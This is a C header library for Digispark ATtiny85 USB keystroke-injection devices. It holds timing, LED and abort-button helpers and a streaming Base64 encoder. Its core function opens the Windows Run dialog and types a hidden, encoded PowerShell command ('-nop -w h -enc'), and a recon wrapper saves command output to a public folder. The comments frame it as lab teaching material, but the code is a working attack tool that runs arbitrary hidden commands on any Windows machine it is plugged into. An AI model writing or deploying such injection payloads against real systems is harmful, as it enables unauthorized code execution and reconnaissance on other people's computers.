// duck.h - shared helpers for Digispark (ATtiny85 / V-USB) payloads.
//
// FLASH BUDGET
//   digispark-tiny.upload.maximum_size = 6012 bytes.
//   V-USB + DigiKeyboard linkage eats ~2.5-3KB, leaving ~3KB for your
//   payload text. Every function here is `static` so -ffunction-sections +
//   --gc-sections drops the ones a given sketch doesn't call.
//
// WHY POWERSHELL GOES OUT BASE64-ENCODED
//   DigiKeyboard is a US keyboard layout. On a UK layout (and most others)
//   @ " \ | ~ ^ type as the wrong glyph, which silently corrupts any payload
//   containing them. PowerShell's -EncodedCommand wants Base64 of the command
//   in UTF-16LE. Base64 is [A-Za-z0-9+/=] - every one of those is unshifted
//   and in the same physical position on US and UK layouts. So the plaintext
//   never touches the keyboard: it lives in flash, the ATtiny85 encodes it
//   here, and only safe characters go out over HID.
//
//   Trade-off worth knowing: -EncodedCommand is a much louder EDR signal than
//   a plain command line. That is deliberate and teachable - see
//   payloads/train/explain-attack.ino.

#ifndef DUCK_H
#define DUCK_H

#include <DigiKeyboard.h>

// ---------------------------------------------------------------- pins
// Digispark ATTiny85. Note PB0/PB1 are shared with the USB D-/D+ lines, which
// is why the onboard LED is on the same pin the core uses for HID LED state.
// The LED will flicker while USB is active; that's normal, not a fault.
#ifndef DUCK_LED_PIN
#define DUCK_LED_PIN 1  // PB1 - onboard LED on Rev3. Set 0 for some Rev1/2.
#endif
#ifndef DUCK_BTN_PIN
#define DUCK_BTN_PIN 2  // PB2 - free pin, wire a button to GND for abort.
#endif

// ------------------------------------------------------------ behaviour
#ifndef DUCK_ARM_MS
#define DUCK_ARM_MS 5000  // OS driver-install + enumeration window.
#endif
#ifndef DUCK_KEY_MS
#define DUCK_KEY_MS 2     // inter-key delay. Raise to 6-8 on slow/VM hosts.
#endif
#ifndef DUCK_SETTLE_MS
#define DUCK_SETTLE_MS 900  // after Win+R before typing the command.
#endif
#ifndef DUCK_FINISH_MS
#define DUCK_FINISH_MS 1500  // after Enter, before the sketch ends.
#endif

// Where recon output lands on the target. Public profile = no elevation
// needed to read, and survives the user session ending.
#ifndef DUCK_OUT
#define DUCK_OUT "C:\\Users\\Public\\ds-recon\\"
#endif

// PowerShell-side path helpers. These are string literals, so adjacent
// concatenation ("a" R_DIR "b") is folded at compile time and costs nothing in
// flash. Keeping them here means no sketch ever types a raw ':' or '\', which
// is what would break on a UK layout.
#define R_DIR "C:\\Users\\Public\\ds-recon\\"
#define R_MKDIR "New-Item -Path 'C:\\Users\\Public\\ds-recon' -ItemType Directory -Force|Out-Null;"
#define R_OUT(f) "|Out-File -Encoding UTF8 '" R_DIR f "'"
#define R_SHOW(f) ";notepad '" R_DIR f "'"


// Uncomment to require holding the button at plug-in before anything fires.
// Adds a real two-stage safety interlock at the cost of plug-and-go realism.
// #define DUCK_ARM_ON_BUTTON
#ifndef DUCK_ARM_ON_BUTTON
#define DUCK_ARM_ON_BUTTON 0
#endif

// DigiKeyboard's key set is narrower than it looks:
//   - the enter key is KEY_ENTER, there is no KEY_RETURN
//   - there is no ESC, TAB, PrintScreen, or anything past F12
// ESC is HID usage 0x29 and TAB is 0x2B on the Keyboard usage page (0x07), so
// send those as raw usage codes with press().
//
//   press(KEY_ENTER);
//   press(DUCK_KEY_ESC);
#define DUCK_KEY_ESC 0x29
#define DUCK_KEY_TAB 0x2B


// ------------------------------------------------------------------ LED

static void ledOn() {
  pinMode(DUCK_LED_PIN, OUTPUT);
  digitalWrite(DUCK_LED_PIN, LOW);  // Digispark LED is active-low.
}

static void ledOff() {
  pinMode(DUCK_LED_PIN, OUTPUT);
  digitalWrite(DUCK_LED_PIN, HIGH);
}

// Solid = armed, waiting out the enumeration window. Pulse = payload running.
static void ledPulse(unsigned int times, unsigned int onMs, unsigned int offMs) {
  for (unsigned int i = 0; i < times; i++) {
    ledOn();
    delay(onMs);
    ledOff();
    delay(offMs);
  }
}

static void ledSolid(unsigned int ms) {
  ledOn();
  delay(ms);
  ledOff();
}

// ---------------------------------------------------------------- button

static void buttonSetup() {
  pinMode(DUCK_BTN_PIN, INPUT_PULLUP);
}

static bool buttonDown() {
  return digitalRead(DUCK_BTN_PIN) == LOW;
}

// Delay that can be interrupted. Returns true if it ran to completion,
// false if the abort button was pressed.
static bool delayOrAbort(unsigned long ms) {
  unsigned long step = 25;
  while (ms) {
    if (buttonDown()) {
      ledOff();
      return false;
    }
    unsigned int slice = ms < step ? ms : step;
    delay(slice);
    ms -= slice;
  }
  return true;
}

// ----------------------------------------------------------------- chords

static void chord(uint8_t mod, uint8_t key) {
  DigiKeyboard.sendKeyStroke(key, mod);
  DigiKeyboard.delay(DUCK_KEY_MS);
}

static void gui(uint8_t key)  { chord(MOD_GUI_LEFT, key); }
static void ctrl(uint8_t key) { chord(MOD_CONTROL_LEFT, key); }
static void alt(uint8_t key)  { chord(MOD_ALT_LEFT, key); }
static void shift(uint8_t key){ chord(MOD_SHIFT_LEFT, key); }

static void press(uint8_t key) {
  DigiKeyboard.sendKeyStroke(key);
  DigiKeyboard.delay(DUCK_KEY_MS);
}

static void hit(uint8_t key) {  // press + release, with settle
  press(key);
  delay(DUCK_SETTLE_MS);
}

// Type a string that lives in SRAM. Reserved for strings built at runtime -
// almost nothing should need this.
static void typeStr(const char *s) {
  DigiKeyboard.print(s);
  DigiKeyboard.delay(DUCK_KEY_MS);
}

// Type a string that lives in FLASH.
//
// This matters more than it looks. On AVR a plain string literal is copied into
// SRAM at startup, and the ATtiny85 has 512 bytes of SRAM TOTAL. A 700-byte
// banner compiled the naive way reports "Global variables use 841 bytes",
// overruns the chip, and fails at runtime even though the compiler allowed it.
// Flash has nearly 3KB spare by comparison.
//
// DigiKeyboard has no print_P(), so this walks the string itself and pushes
// each character through write(), which reads a PROGMEM scancode table.
//
// ALL strings in this library are flash. That is a hard convention so there is
// never a question about which reader to use:
//
//   TYPE("short literal")        -> PSTR, compiler folds it into flash
//   typeFlash(LONG_ARRAY)        -> a PROGMEM array
//
// Note pgm_read_byte() and plain array indexing are NOT interchangeable here.
// Getting that backwards reads garbage out of an unrelated part of flash.
static void typeFlash(const char *p) {
  char c;
  while ((c = (char)pgm_read_byte(p++)) != '\0') {
    if (c == '\n') {
      // There is no KEY_RETURN in this library. Windows text entry wants CR.
      DigiKeyboard.write('\r');
      DigiKeyboard.write('\n');
    } else {
      DigiKeyboard.write((uint8_t)c);
    }
    DigiKeyboard.delay(DUCK_KEY_MS);
  }
}

// Shorthand for a flash literal.
#define TYPE(x) typeFlash(PSTR(x))



// Windows Run dialog. Everything funnels through here.
static void openRun() {
  gui(KEY_R);
  delay(DUCK_SETTLE_MS);
}

// ------------------------------------------------------------- base64

static const char DUCK_B64[] PROGMEM =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Stream Base64(UTF16LE(script)) straight to the keyboard.
//
// Deliberately bufferless. The ATtiny85 has 512 bytes of SRAM in total and a
// 534-byte output buffer would not coexist with V-USB, so this encodes three
// source bytes at a time and emits four characters immediately.
//
// `script` lives in FLASH, like every other string in this library.
static void typeEncoded(const char *script) {
  uint16_t chars = 0;
  while (pgm_read_byte(script + chars)) chars++;

  uint32_t total = (uint32_t)chars * 2;  // UTF-16LE byte length
  uint32_t acc = 0;
  uint8_t have = 0;
  uint32_t i = 0;

  while (i < total) {
    // UTF-16LE: ASCII char then NUL, alternating.
    uint8_t b = (i & 1) ? 0x00 : pgm_read_byte(script + (i >> 1));
    i++;
    acc = (acc << 8) | b;
    have++;
    if (have == 3) {
      DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 18) & 0x3F)));
      DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 12) & 0x3F)));
      DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 6) & 0x3F)));
      DigiKeyboard.write(pgm_read_byte(DUCK_B64 + (acc & 0x3F)));
      DigiKeyboard.delay(DUCK_KEY_MS);
      acc = 0;
      have = 0;
    }
  }


// Flush the ragged tail with correct padding.
  if (have == 1) {
    acc <<= 16;
    DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 18) & 0x3F)));
    DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 12) & 0x3F)));
    DigiKeyboard.write('=');
    DigiKeyboard.write('=');
  } else if (have == 2) {
    acc <<= 8;
    DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 18) & 0x3F)));
    DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 12) & 0x3F)));
    DigiKeyboard.write(pgm_read_byte(DUCK_B64 + ((acc >> 6) & 0x3F)));
    DigiKeyboard.write('=');
  }
  DigiKeyboard.delay(DUCK_KEY_MS);
}

// --------------------------------------------------------------- run PS

// Win+R -> powershell -nop -w h -enc <base64>
//
// `hidden` suppresses the console window. Pass false while learning so you can
// watch it run and catch mistakes - in a lab you generally want it visible.
//
// `script` MUST live in flash. To make that unambiguous use the macros, which
// fold adjacent literals together at compile time and cost nothing extra:
//
//   static const char S[] PROGMEM = "whoami";
//   runPS(S);
static void runPS(const char *script, bool hidden = true,
                  unsigned long finishMs = DUCK_FINISH_MS) {
  openRun();
  TYPE("powershell -nop");
  if (hidden) TYPE(" -w h");
  TYPE(" -enc ");
  typeEncoded(script);
  press(KEY_ENTER);
  delayOrAbort(finishMs);
}

// Standard recon wrapper.
//
// The script opens its own output file via R_SHOW, and that opening happens
// INSIDE the base64'd payload - so no raw ':' or '\' is ever sent over HID.
// Being "clever" here and opening notepad from C++ means typing a Windows path,
// which is exactly the thing that corrupts on a non-US layout. Don't.
//
//   static const char S[] PROGMEM =
//     R_MKDIR "whoami" R_OUT("hostid.txt") R_SHOW("hostid.txt");
//   recon(S);
static void recon(const char *script, unsigned long finishMs = 2500) {
  runPS(script, true, finishMs);
}

// -------------------------------------------------------------- start-up


// Call first from setup(). Handles the LED indicator, the arming window and
// the optional button interlock. Returns false if the payload should abort.
static bool duckBegin(bool requireButton = false) {
  buttonSetup();
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(250);

  if (requireButton || DUCK_ARM_ON_BUTTON) {
    // Wait for the operator to hold the button to arm.
    ledPulse(3, 150, 150);
    while (!buttonDown()) {
      ledPulse(1, 400, 400);
    }
    ledSolid(300);
  }

  ledSolid(DUCK_ARM_MS);
  return true;
}

#endif  // DUCK_H
